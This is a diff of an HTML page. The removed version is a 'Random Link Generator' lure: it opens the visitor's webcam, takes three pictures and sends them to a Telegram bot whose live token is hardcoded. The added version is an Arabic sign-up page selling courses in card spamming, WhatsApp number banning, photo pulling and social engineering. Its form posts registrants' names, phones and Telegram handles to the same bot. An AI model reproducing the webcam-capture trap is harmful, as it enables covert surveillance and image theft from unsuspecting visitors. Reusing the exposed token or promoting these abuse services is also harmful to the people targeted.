@@ -1,110 +1,90 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Random Link Generator</title>
-  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
-  <style>
-   .link-container {
-      @apply mt-4;
-    }
-   .link-message {
-      @apply text-gray-600;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تـسـجـيـل🇵🇸 فـي كـورس الـمـزعـج 🇵🇸</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta2/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 </head>
-<body>
-  <div class="h-screen flex flex-col justify-center items-center bg-gradient-to-r from-purple-500 to-pink-500">
-    <h1 class="text-6xl font-bold text-white mb-8">Random Link Generator</h1>
-    <button class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded" id="generate-link-btn">Generate Link</button>
-    <div class="link-container hidden" id="link-container">
-      <a href="" id="generated-link" target="_blank"></a>
-      <p class="link-message" id="link-message"></p>
+<body class="bg-gradient-to-r from-purple-500 to-pink-500 flex items-center justify-center h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
+        <h1 class="text-3xl font-semibold mb-4 text-center">تـسـجـيـل فـي كـورس الـمـزعـج</h1>
+        <p class="text-gray-600 mb-6">اخـتـار🇵🇸 الـكـورس [جـمـيـع الـكـورسـات مـدفوعـه]🇵🇸 </p>
+        <form id="registrationForm">
+            <div class="mb-4">
+                <label for="course" class="block text-sm font-medium text-gray-700">🆕حـدد الـكـورس🆕</label>
+                <select id="course" name="course" class="mt-1 block w-full pl-3 pr-10 py-2 text-base border-gray-300 focus:outline-none focus:ring-purple-500 focus:border-purple-500 sm:text-sm rounded-md">
+                    <option value="كورس اسبام فيزات">كورس اسبام فيزات- 150 EGP🇪🇬</option>
+                    <option value="كورس شحن اللعاب">كورس شحن اللعاب - 150 EGP🇪🇬</option>
+                    <option value="كورس حظر ارقام واتساب">كورس حظر ارقام واتساب Course - 100 EGP</option>
+                    <option value="كورس بايثون 3">Python 3 Course - 170 EGP🇪🇬</option>
+                    <option value="كورس تصميم مواقع ويب">كورس تصميم مواقع ويب - 190 EGP</option>
+                    <option value="كورس تصميم تطبيقات">كورس تصميم تطبيقات - 80 EGP</option>
+                    <option value="كورس سحب الصور">كورس سحب الصور - 250 EGP🇪🇬</option>
+                    <option value="كورس هندسه اجتماعيه">كورس هندسه اجتماعيه - 350 EGP</option>
+                    <option value="كورس الاخلاقي">كورس الاخلاقي - 450 EGP🇪🇬</option>
+                    <option value="كورس جميع لغات البرمجه">كورس جميع لغات البرمجه - 550 EGP</option>
+                    <option value="الكورس الشامل">الكورس الشامل - 750 EGP🇪🇬</option>
+                </select>
+            </div>
+            <div class="mb-4">
+                <label for="fullname" class="block text-sm font-medium text-gray-700">ادخـل اسـمـك 🍂 ثلااثـي </label>
+                <input type="text" name="fullname" id="fullname" class="mt-1 p-2 w-full border rounded-md shadow-sm" required>
+            </div>
+            <div class="mb-4">
+                <label for="phone" class="block text-sm font-medium text-gray-700">ادخـل رقـمـك [برمز الدوله مثال +20]</label>
+                <input type="tel" name="phone" id="phone" class="mt-1 p-2 w-full border rounded-md shadow-sm" required>
+            </div>
+            <div class="mb-4">
+                <label for="telegram" class="block text-sm font-medium text-gray-700">ادخل يوزر التليجرام اذا متوفر ✅</label>
+                <input type="text" name="telegram" id="telegram" class="mt-1 p-2 w-full border rounded-md shadow-sm"> 
+            </div>
+            <p class="text-gray-600 mb-4">We accept all payment methods inside and outside Egypt.</p>
+            <button type="submit" class="bg-purple-600 text-white px-4 py-2 rounded-md hover:bg-purple-700 transition duration-300">Submit</button>
+        </form>
+        <div class="mt-4 text-center text-gray-600">
+            <p>المطور : المزعج الحاكم </p>
+            <p>قناتي: <a href="https://t.me/XAlmoz3j" target="_blank" class="text-transparent bg-transparent hover:text-purple-600 transition duration-300">https://t.me/XAlmoz3j</a></p>
+            <p>شاتي : <a href="https://t.me/Z_Y_Y_S" target="_blank" class="text-transparent bg-transparent hover:text-purple-600 transition duration-300">https://t.me/Z_Y_Y_S</a></p>
+        </div>
     </div>
-    <div class="camera-container hidden" id="camera-container">
-      <video id="video" width="640" height="480"></video>
-      <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" id="take-picture-btn">Take Picture</button>
-    </div>
-  </div>
 
-  <script>
-    const generateLinkBtn = document.getElementById('generate-link-btn');
-    const linkContainer = document.getElementById('link-container');
-    const generatedLink = document.getElementById('generated-link');
-    const linkMessage = document.getElementById('link-message');
-    const cameraContainer = document.getElementById('camera-container');
-    const video = document.getElementById('video');
-    const takePictureBtn = document.getElementById('take-picture-btn');
+    <script>
+        const form = document.getElementById('registrationForm');
 
-    let picturesTaken = 0;
-    const telegramBotToken = '7700344369:AAExr9dJnXEEN74xLW_WlqCASGW4qtAqj4M';
-    const telegramBotApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
 
-    generateLinkBtn.addEventListener('click', generateRandomLink);
+            const formData = new FormData(this);
+            const course = formData.get('course');
+            const fullname = formData.get('fullname');
+            const phone = formData.get('phone');
+            const telegram = formData.get('telegram');
 
-    async function generateRandomLink() {
-      try {
-        const link = `https://example.com/${Math.random().toString(36).substr(2, 9)}`;
-        generatedLink.href = link;
-        generatedLink.textContent = link;
-        linkContainer.classList.remove('hidden');
-        linkMessage.textContent = 'Click the link to take 3 pictures!';
-        generatedLink.addEventListener('click', async () => {
-          await takePictures();
-        });
-      } catch (error) {
-        console.error(error);
-      }
-    }
+            const botToken = '7700344369:AAExr9dJnXEEN74xLW_WlqCASGW4qtAqj4M';
+            const chatId = '5545530980';
+            const text = `
+                مشترك جديد في كورس المزعح: 
+                Course: ${course}
+                اسم المشترك في الكورس  : ${fullname}
+                رقم المشترك: ${phone}
+                تليجرام المشترك: ${telegram}
+            `;
 
-    async function takePictures() {
-      try {
-        cameraContainer.classList.remove('hidden');
-        await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-         .then(stream => {
-            video.srcObject = stream;
-            video.play();
-            takePictureBtn.addEventListener('click', async () => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              const picture = canvas.toDataURL('image/jpeg');
-              await sendPictureToTelegramBot(picture);
-              picturesTaken++;
-              if (picturesTaken === 3) {
-                cameraContainer.classList.add('hidden');
-              }
+            axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                chat_id: chatId,
+                text: text
+            })
+           .then(function(response) {
+                alert('Your registration for the course has been sent to the annoying person. Please wait. Do not repeat the registration so that you are not blocked.');
+                form.reset();
+            })
+           .catch(function(error) {
+                alert('Error submitting registration. Please try again.');
             });
-          })
-         .catch(error => {
-            console.error(error);
-          });
-      } catch (error) {
-        console.error(error);
-      }
-    }
-
-    async function sendPictureToTelegramBot(picture) {
-      try {
-        const response = await fetch(telegramBotApiUrl, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: '@your_channel_username',
-            photo: picture
-          })
         });
-        const data = await response.json();
-        console.log(data);
-      } catch (error) {
-        console.error(error);
-      }
-    }
-  </script>
+    </script>
 </body>
 </html>
